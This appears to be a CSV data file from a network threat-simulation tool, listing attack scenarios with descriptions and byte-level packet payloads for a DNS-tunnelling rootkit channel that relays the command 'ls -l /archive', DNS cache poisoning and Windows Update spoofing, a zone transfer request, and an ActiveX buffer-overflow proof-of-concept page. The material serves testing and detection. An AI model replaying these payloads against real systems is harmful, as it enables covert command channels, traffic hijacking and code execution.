XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,x||E4 00 00 00 01 00 00 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01||
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,4||D1 00 00 00 01 00 00 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01||
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,||12 F0 84 00 00 01 00 01 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01 C0 0C 00 01 00 01 00 00 00 00 00 04 01 00 00 00||
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,||89 84 84 00 00 01 00 01 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01 C0 0C 00 01 00 01 00 00 00 00 00 04 01 00 00 00||
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,x||E4 84 00 00 01 00 05 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01 C0 0C 00 01 00 01 00 00 00 00 00 04 01 FD 0E 00 C0 0C 00 01 00 01 00 00 00 00 00 04 ||ls -||C0 0C 00 01 00 01 00 00 00 00 00 04 ||l /a||C0 0C 00 01 00 01 00 00 00 00 00 04 ||rchi||C0 0C 00 01 00 01 00 00 00 00 00 04 ||ve\0
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,4||D1 84 00 00 01 00 02 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01 C0 0C 00 01 00 01 00 00 00 00 00 04 00 FF 04 00 C0 0C 00 01 00 01 00 00 00 00 00 04 07 B3 ||B||A9||
﻿dns_rev.xml,DNS Reverse Address Lookup Spoofing,"This threat is an attempt to poison the DNS cache on Microsoft's ISA Server as described in MS04-039.  It replicates a reply to a proxy server, trying to alter its DNS information for google.com to point to IP address 192.168.0.5",DNS,UDP,D*||81 80 00 01 00 01 00 00 00 00 01 ||5||01 ||0||03 ||168||03 ||192||07 ||in-addr||04 ||arpa||00 00 0C 00 01 C0 0C 00 0C 00 01 00 01 ||Q||80 00 0C 06 ||google||03 ||com||00||
﻿dns_transfer.xml,Domain Transfer Request,"This threat issues a domain transfer request for imperfetnetworks.com, listing all of the addresses contained therein.  This is normally used by attackers to discover potentially overlooked and vulnerable machines, and also to provide a window into the structure of an internal network.  Domain transfers typically occur over TCP port 53.",DNS,TCP,||00 ||'||95 ||f||00 00 00 01 00 00 00 00 00 00 11 ||imperfectnetworks||03 ||com||00 00 FC 00 01||
﻿sun_jre_dnsResolve_bof.xml,Sun jre1.6.0_X isInstalled.dnsResolve ActiveX Control Buffer Overflow Vulnerability,"This threat downloads a malicious web page which triggers a buffer overflow in the Sun (jre1.6.0_X) isInstalled.dnsResolve function with an ActiveX Control, resulting in the execution of arbitrary code or denial of service. This threat is delivered via HTTP port 80.",HTTP,TCP,GET /index.html HTTP/1.0||0D 0A ||Host||3A || www.site.net||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1)||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
sun_jre_dnsResolve_bof.xml,Sun jre1.6.0_X isInstalled.dnsResolve ActiveX Control Buffer Overflow Vulnerability,"This threat downloads a malicious web page which triggers a buffer overflow in the Sun (jre1.6.0_X) isInstalled.dnsResolve function with an ActiveX Control, resulting in the execution of arbitrary code or denial of service. This threat is delivered via HTTP port 80.",HTTP,TCP,"HTTP/1.0 200 OK||0D 0A ||Tue, 18 Sept 2007 10||3A ||08||3A ||40 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content Type||3A || text/html||0D 0A 0D 0A ||<html>||0D 0A ||<body>||0D 0A ||<center>||0D 0A ||Sun (jre1.6.0_X) isInstalled.dnsResolve function overflow PoC<br>||0D 0A ||</center>||0D 0A ||<object classid=||22 ||CLSID||3A ||5852F5ED-8BF4-11D4-A245-0080C6F74284||22 0D 0A ||id=||22 ||target||22 ||></OBJECT>||0D 0A ||<SCRIPT language=||22 ||javascript||22 ||>||0D 0A ||var b = 'XXXX'||3B 0D 0A ||while (b.length <= 512*512) b+=b||3B 0D 0A ||target.dnsResolve(b)||3B 0D 0A ||</script>||0D 0A ||</body>||0D 0A ||</html>"
﻿﻿windowsupdateDNSSpoof.xml,Windows Update Spoofing Attempt,This threat mimics the ability of a DNS spoof attempt trying to redirect a request for windowsupdate.microsoft.com to a malicious server.  This could be used as a compound attack attempting to convince a user to download a malicious executable.,DNS,UDP,||00 01 81 80 00 01 00 01 00 00 00 00 0D ||windowsupdate||09 ||microsoft||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 00 ||<||00 04 C0 A8 03 05||
